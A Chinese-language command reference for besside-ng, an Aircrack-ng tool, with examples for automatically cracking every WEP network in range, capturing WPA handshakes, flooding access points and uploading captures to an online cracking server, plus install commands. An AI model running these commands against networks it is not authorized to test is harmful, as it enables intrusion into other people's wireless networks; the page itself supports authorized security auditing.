# TAGLINE

自动化 WiFi 安全审计工具

# TLDR

**自动破解所有 WEP 网络并记录 WPA 握手**

```besside-ng [wlan0mon]```

**针对指定接入点**

```besside-ng -b [AA:BB:CC:DD:EE:FF] [wlan0mon]```

**锁定到指定信道**

```besside-ng -c [6] [wlan0mon]```

**仅抓取 WPA 握手**

```besside-ng -W [wlan0mon]```

**将捕获的握手上传到破解服务器**

```besside-ng -s [wpa.darkircop.org] [wlan0mon]```

**设置泛洪速率**

```besside-ng -p [300] [wlan0mon]```

# SYNOPSIS

**besside-ng** [_options_] _interface_

# DESCRIPTION

**besside-ng** 是 Aircrack-ng 套件中的自动化 WiFi 安全审计工具。它会自动破解范围内所有的 WEP 网络，并捕获 WPA 握手以供后续破解。

该工具需要处于监听模式的无线接口。捕获的 WPA 握手会保存到 wpa.cap，供 aircrack-ng 或在线破解服务使用。

# PARAMETERS

**-b** _bssid_
> 通过 MAC 地址针对指定的接入点

**-c** _channel_
> 锁定到指定信道（否则在各信道间跳频）

**-s** _server_
> 将抓包文件上传到 WPA 破解服务器（例如 wpa.darkircop.org）

**-p** _pps_
> 每秒发送的数据包数（泛洪速率）

**-W**
> 仅破解 WPA 网络（跳过 WEP）

**-v**
> 详细输出模式；重复使用（-vv、-vvv）可获得更多细节

**-h**
> 显示帮助界面

# OUTPUT FILES

**wpa.cap**
> 捕获的 WPA 握手，可供 aircrack-ng 直接使用

**wep.cap**
> 捕获的 WEP 流量

**besside.log**
> 已破解网络和握手状态的日志

# CAVEATS

需要处于监听模式的无线接口。只能在你拥有或已获明确授权测试的网络上使用。WPA 破解需要在捕获握手后进行字典攻击。某些接入点可能会检测并阻止泛洪攻击。

# INSTALL

```apt: sudo apt install aircrack-ng```

```dnf: sudo dnf install aircrack-ng```

```pacman: sudo pacman -S aircrack-ng```

```apk: sudo apk add aircrack-ng```

```zypper: sudo zypper install aircrack-ng```

```brew: brew install aircrack-ng```

```nix: nix profile install nixpkgs#aircrack-ng```

<!-- packages: 2026-07-22 -->
# SEE ALSO

[aircrack-ng](/man/aircrack-ng)(1), [airodump-ng](/man/airodump-ng)(1), [aireplay-ng](/man/aireplay-ng)(1), [airmon-ng](/man/airmon-ng)(1)

# RESOURCES

```[Source code](https://github.com/aircrack-ng/aircrack-ng)```

```[Documentation](https://www.aircrack-ng.org/doku.php?id=besside-ng)```

```[Homepage](https://www.aircrack-ng.org/)```

<!-- verified: 2026-06-19 -->
